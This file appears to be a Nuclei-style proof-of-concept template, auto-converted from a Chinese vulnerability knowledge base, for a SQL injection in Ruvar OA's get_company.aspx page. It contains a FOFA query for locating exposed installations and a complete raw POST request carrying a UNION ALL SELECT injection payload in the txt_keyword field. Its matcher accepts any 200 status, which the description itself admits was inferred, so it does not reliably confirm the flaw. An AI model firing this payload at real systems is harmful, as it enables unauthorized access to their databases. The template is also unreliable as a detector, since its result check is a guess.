@@ -1,0 +1,46 @@
+id: poc-8cd757df8ee15a67fbbb
+info:
+  name: RuvarOAget_company存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8cd757df8ee15a67fbbba0cd7616fe12
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 8cd757df8ee15a67fbbba0cd7616fe12
+    fofa: + fofa`body="txt_admin_key"`
+http:
+- raw:
+  - 'POST /ContractManage/get_company.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 527
+
+    Cache-Control: max-age=0
+
+    DNT: 1
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (X11; Linux i686) Gecko/20060204 Firefox/114.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
+
+    Connection: close
+
+
+    __EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=/wEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkkF7Fra0mv6NIEvEWzCtrd3VHKNxuM7stEqn5DF0zdWg=&ddl_type=&ddl_field=dw_bh&txt_keyword=11%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2883%29%2BCHAR%2871%29%2BCHAR%2878%29%2BCHAR%28117%29%2BCHAR%28106%29%2BCHAR%2870%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%28122%29%2BCHAR%28101%29%2BCHAR%2898%29%2BCHAR%2872%29%2BCHAR%2866%29%2BCHAR%2869%29%2BCHAR%28113%29%2BCHAR%28116%29%2BCHAR%2884%29%2BCHAR%28107%29%2BCHAR%2881%29%2BCHAR%2880%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%28118%29%2BCHAR%2872%29%2BCHAR%2875%29%2BCHAR%28121%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%2890%29%2BCHAR%2882%29%2BCHAR%28122%29%2BCHAR%2897%29%2BCHAR%2868%29%2BCHAR%28103%29%2BCHAR%2886%29%2BCHAR%28114%29%2BCHAR%28111%29%2BCHAR%2885%29%2BCHAR%28120%29%2BCHAR%2868%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29--+YZtQ&btnSearch=%E6%9F%A5%E8%AF%A2&pager_input=1&pager_select=20&txt_row_index=&txt_dw_id=&txt_dw_mc=&txt_dw_bh=&txt_dw_lxr=&txt_dw_dh='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
